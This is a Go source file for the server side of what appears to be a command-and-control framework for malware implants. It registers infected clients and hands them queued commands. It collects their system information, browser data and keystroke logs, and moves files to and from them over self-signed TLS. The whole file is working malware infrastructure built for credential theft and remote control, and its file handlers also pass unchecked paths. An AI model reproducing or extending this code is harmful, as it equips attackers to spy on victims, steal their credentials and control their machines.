package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"io/ioutil"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"server/cli"
	"server/common"
	"server/config"
	"server/database"
)

var dbFile = "../cmd/w0lf.db"
var db *database.Database

type CertBundle struct {
	CACert     []byte
	CAKey      []byte
	ServerCert []byte
	ServerKey  []byte
}

func main() {

	var err error
	db, err = database.New(dbFile)
	if err != nil {
		fmt.Println("Database not running: %v", err)
	}

	http.HandleFunc("/register", registerHandler)
	http.HandleFunc("/command", commandHandler)
	http.HandleFunc("/data", dataHandler)
	http.HandleFunc("/filetransfer", handleFileTransfer)

	sigChan := make(chan os.Signal, 1)

	if runtime.GOOS == "windows" {
		// Windows only supports SIGINT and SIGTERM
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	} else {
		// Unix-like systems
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGQUIT, syscall.SIGTERM)
	}

	go func() {
		for {
			sig := <-sigChan
			switch sig {
			case syscall.SIGINT, syscall.SIGQUIT:
				fmt.Printf("\n\n[!] Use exit command to quit\n")
			default:
				fmt.Printf("\n\n[!] Unknown signal received: %v\n", sig)
			}
		}
	}()

	go func() {
		fmt.Printf("Server is starting on port %s with HTTPS...\n", config.LISTEN_PORT)

		// Load TLS certificates
		cert, err := tls.X509KeyPair(config.C2_CERT, config.C2_KEY)
		if err != nil {
			fmt.Printf("Certificate loading error: %v\n", err)
			return
		}

		// TLS config
		tlsConfig := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			MinVersion:         tls.VersionTLS12,
			InsecureSkipVerify: true,
		}

		// HTTPS server
		server := &http.Server{
			Addr:         ":" + config.LISTEN_PORT,
			TLSConfig:    tlsConfig,
			ReadTimeout:  5 * time.Minute,
			WriteTimeout: 5 * time.Minute,
			IdleTimeout:  120 * time.Second,
		}

		// Start TLS server
		err = server.ListenAndServeTLS("", "")
		if err != nil {
			fmt.Printf("HTTPS Server Failed: %v\n", err)
		}
	}()

	cli.CLI()
	return

}

func registerHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST requests are allowed", http.StatusMethodNotAllowed)
		return
	}

	// Read the data from the request body.
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Request body could not be read", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	// Parse the JSON data into the RegisterData structure.
	var client common.Client

	if err := json.Unmarshal(body, &client); err != nil {
		http.Error(w, "JSON could not be parsed", http.StatusBadRequest)
		return
	}

	now := time.Now().Unix()

	var clientDB common.ClientDB
	clientDB.ClientID = client.ClientID
	clientDB.OS = client.OS
	clientDB.BuildID = client.BuildID
	clientDB.Hostname = client.Hostname
	clientDB.ClientName = ""
	clientDB.IP = ""
	clientDB.ReceivedAt = now
	clientDB.LastSeen = now

	db := database.GetDatabase()
	err = db.AddClient(clientDB)

	w.Header().Set("Connection", "keep-alive")

	w.WriteHeader(http.StatusOK)
}

func commandHandler(w http.ResponseWriter, r *http.Request) {

	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	type CommandRequest struct {
		ClientID string `json:"client_id"`
	}

	type CommandResponse struct {
		Command string `json:"command"`
	}

	var req CommandRequest
	var commandResponse CommandResponse
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid JSON payload", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.ClientID == "" {
		http.Error(w, "Missing client_id", http.StatusBadRequest)
		return
	}

	db := database.GetDatabase()
	command, err := db.GetCommand(req.ClientID)

	commandResponse.Command = command

	if err != nil {
		http.Error(w, "Command could not be retrieved", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(commandResponse); err != nil {
		http.Error(w, "Failed to encode response", http.StatusInternalServerError)
		return
	}

	/*if err := json.NewEncoder(w).Encode(respData); err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}*/
}

func dataHandler(w http.ResponseWriter, r *http.Request) {

	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	// Parse the JSON data
	var data struct {
		ClientID string                 `json:"client_id"`
		Type     string                 `json:"type"` // "systeminfo" etc.
		Data     map[string]interface{} `json:"data"`
	}

	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	db := database.GetDatabase()

	var err error
	switch data.Type {
	case "systeminfo":
		var systemInfo common.SystemInfo
		jsonData, _ := json.Marshal(data.Data)
		if err := json.Unmarshal(jsonData, &systemInfo); err != nil {
			http.Error(w, "Invalid systeminfo data format", http.StatusBadRequest)
			return
		}
		err = db.SaveSystemInfo(data.ClientID, systemInfo)

	case "browser":
		var browserDataList []common.BrowserData

		for key, value := range data.Data {
			if strings.HasPrefix(key, "browser_data_") {
				var browserData common.BrowserData

				jsonData, _ := json.Marshal(value)
				if err := json.Unmarshal(jsonData, &browserData); err != nil {
					continue
				}
				browserData.ClientID = data.ClientID
				browserDataList = append(browserDataList, browserData)
			}
		}
		err = db.SaveBrowserData(browserDataList)
	case "keylog":
		var keyLogs []common.KeyLogData

		for key, value := range data.Data {
			if strings.HasPrefix(key, "keystroke_") {
				var entry common.KeyLogData
				jsonData, _ := json.Marshal(value)
				if err := json.Unmarshal(jsonData, &entry); err != nil {
					continue
				}
				entry.ClientID = data.ClientID
				keyLogs = append(keyLogs, entry)
			}
		}

		err = db.SaveKeyLogs(keyLogs)

	/*case "keylogger":
	err = db.SaveData(data.ClientID, "keylogger", data.Data)
	case "sshlog":
	err = db.SaveData(data.ClientID, "sshlog", data.Data)*/
	default:
		fmt.Printf("Unknown data type: %s\n", data.Type)
	}

	if err != nil {
		fmt.Printf("Data could not be saved: %v\n", err)
		http.Error(w, "Data could not be saved", http.StatusInternalServerError)
		return
	}

	// Print the data
	fmt.Printf("\nReceived %s data from client %s\n", data.Type, data.ClientID)
	/*for k, v := range data.Data {
		fmt.Printf("%s: %v\n", k, v)
	}*/

	w.Header().Set("Connection", "keep-alive")
	w.WriteHeader(http.StatusOK)
}

type FileResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
	Hash    string `json:"hash,omitempty"`
	Size    int64  `json:"size,omitempty"`
}

func handleFileTransfer(w http.ResponseWriter, r *http.Request) {
	action := r.URL.Query().Get("action")

	switch action {
	case "download":
		handleFileDownload(w, r)
	case "upload":
		handleFileUpload(w, r)
	default:
		http.Error(w, "Invalid Process", http.StatusBadRequest)
	}
}

func handleFileDownload(w http.ResponseWriter, r *http.Request) {
	// Get file name and size from header
	fileName := r.Header.Get("X-File-Name")
	fileSize := r.Header.Get("X-File-Size")
	fileHash := r.Header.Get("X-File-Hash")

	w.Header().Set("Connection", "keep-alive")

	if fileName == "" {
		sendErrorResponse(w, "File name not specified")
		return
	}

	// Save the file
	uploadDir := "../cmd/downloads" // Directory where files will be saved on the server
	if err := os.MkdirAll(uploadDir, 0755); err != nil {
		sendErrorResponse(w, fmt.Sprintf("Directory creation error: %v", err))
		return
	}

	filePath := filepath.Join(uploadDir, fileName)
	file, err := os.Create(filePath)
	if err != nil {
		sendErrorResponse(w, fmt.Sprintf("File creation error: %v", err))
		return
	}
	defer file.Close()

	// Calculate hash
	hash := sha256.New()
	writer := io.MultiWriter(file, hash)

	// Write the file
	bytesWritten, err := io.Copy(writer, r.Body)
	if err != nil {
		sendErrorResponse(w, fmt.Sprintf("File write error: %v", err))
		return
	}

	// Verify hash
	calculatedHash := hex.EncodeToString(hash.Sum(nil))
	if fileHash != "" && calculatedHash != fileHash {
		os.Remove(filePath) // Delete the corrupted file
		sendErrorResponse(w, fmt.Sprintf("Hash mismatch: expected %s, calculated %s", fileHash, calculatedHash))
		return
	}

	// Verify size
	if fileSize != "" {
		expectedSize, err := strconv.ParseInt(fileSize, 10, 64)
		if err == nil && bytesWritten != expectedSize {
			os.Remove(filePath) // Delete the corrupted file
			sendErrorResponse(w, fmt.Sprintf("Size mismatch: expected %d, received %d", expectedSize, bytesWritten))
			return
		}
	}

	// Send success response
	sendSuccessResponse(w, fmt.Sprintf("File successfully received: %s (%d bytes)", fileName, bytesWritten), calculatedHash, bytesWritten)
}

func handleFileUpload(w http.ResponseWriter, r *http.Request) {
	// Get the requested file path
	hash := r.URL.Query().Get("path")
	if hash == "" {
		http.Error(w, "File path not specified", http.StatusBadRequest)
		return
	}

	var filePath string

	db := database.GetDatabase()
	fileName, err := db.GetUploadingByHash(hash)

	if err == nil {
		// Hash value found, use the file in uploads directory
		filePath = filepath.Join("../cmd/uploads", fileName)
	} else {
		// Hash value not found, use as direct file path
		filePath = hash
	}

	// Check if file exists
	file, err := os.Open(filePath)
	if err != nil {
		http.Error(w, fmt.Sprintf("File could not be opened: %v", err), http.StatusNotFound)
		return
	}
	defer file.Close()

	// Get file information
	fileInfo, err := file.Stat()
	if err != nil {
		http.Error(w, fmt.Sprintf("File information could not be retrieved: %v", err), http.StatusInternalServerError)
		return
	}

	// Calculate file hash
	fileHash := sha256.New()
	if _, err := io.Copy(fileHash, file); err != nil {
		http.Error(w, fmt.Sprintf("File hash could not be calculated: %v", err), http.StatusInternalServerError)
		return
	}
	fileHash1 := hex.EncodeToString(fileHash.Sum(nil))

	// Reset file position
	if _, err := file.Seek(0, 0); err != nil {
		http.Error(w, fmt.Sprintf("File position could not be reset: %v", err), http.StatusInternalServerError)
		return
	}

	// Set headers
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", fileInfo.Size()))
	w.Header().Set("X-File-Hash", fileHash1)
	w.Header().Set("Connection", "keep-alive")

	// Send the file
	io.Copy(w, file)
}

func sendErrorResponse(w http.ResponseWriter, message string) {
	response := FileResponse{
		Success: false,
		Message: message,
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusBadRequest)
	json.NewEncoder(w).Encode(response)
}

func sendSuccessResponse(w http.ResponseWriter, message, hash string, size int64) {
	response := FileResponse{
		Success: true,
		Message: message,
		Hash:    hash,
		Size:    size,
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

func InitializeServerCertificates() (*CertBundle, error) {
	ca, caPrivKey, err := createCA()
	if err != nil {
		return nil, err
	}

	caCertPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "CERTIFICATE",
		Bytes: ca.Raw,
	})
	caKeyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(caPrivKey),
	})

	// Server certificate creation
	serverCertPEM, serverPrivKey, err := createServerCert(ca, caPrivKey)
	if err != nil {
		return nil, fmt.Errorf("server certificate creation error: %v", err)
	}

	serverKeyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(serverPrivKey),
	})

	return &CertBundle{
		CACert:     caCertPEM,
		CAKey:      caKeyPEM,
		ServerCert: serverCertPEM,
		ServerKey:  serverKeyPEM,
	}, nil

	/*server, serverPrivKey, err := createServerCert(ca, caPrivKey)
	if err != nil {
		return nil, err
	}

	caCert := strings.ReplaceAll(string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: ca.Raw})), "\n", "\n")
	caKey := strings.ReplaceAll(string(pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(caPrivKey)})), "\n", "\n")
	serverCert := strings.ReplaceAll(string(server), "\n", "\\n")
	serverKey := strings.ReplaceAll(string(pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(serverPrivKey)})), "\n", "\n")

	return &CertBundle{
		CACert:     []byte(caCert),
		CAKey:      []byte(caKey),
		ServerCert: []byte(serverCert),
		ServerKey:  []byte(serverKey),
	}, nil*/
}

func createCA() (*x509.Certificate, *rsa.PrivateKey, error) {
	ca := &x509.Certificate{
		SerialNumber: big.NewInt(time.Now().UnixNano()),
		Subject: pkix.Name{
			Organization: []string{fmt.Sprintf("CA-%s", "server")},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		IsCA:                  true,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		BasicConstraintsValid: true,
	}
	caPrivKey, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return nil, nil, err
	}
	caBytes, err := x509.CreateCertificate(rand.Reader, ca, ca, &caPrivKey.PublicKey, caPrivKey)
	if err != nil {
		return nil, nil, err
	}
	ca, err = x509.ParseCertificate(caBytes) // Parse the generated bytes to *x509.Certificate
	if err != nil {
		return nil, nil, err
	}
	//return pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: caBytes}), caPrivKey, nil
	return ca, caPrivKey, nil
}

func createServerCert(ca *x509.Certificate, caPrivKey *rsa.PrivateKey) ([]byte, *rsa.PrivateKey, error) {
	template := &x509.Certificate{
		SerialNumber: big.NewInt(time.Now().UnixNano()),
		Subject: pkix.Name{
			Organization: []string{fmt.Sprintf("Server-%s", "server")},
		},
		NotBefore:   time.Now(),
		NotAfter:    time.Now().AddDate(10, 0, 0),
		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		KeyUsage:    x509.KeyUsageDigitalSignature,
		IPAddresses: []net.IP{net.IPv4(127, 0, 0, 1)},
	}
	serverPrivKey, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return nil, nil, err
	}
	serverBytes, err := x509.CreateCertificate(rand.Reader, template, ca, &serverPrivKey.PublicKey, caPrivKey)
	if err != nil {
		return nil, nil, err
	}
	return pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: serverBytes}), serverPrivKey, nil
}
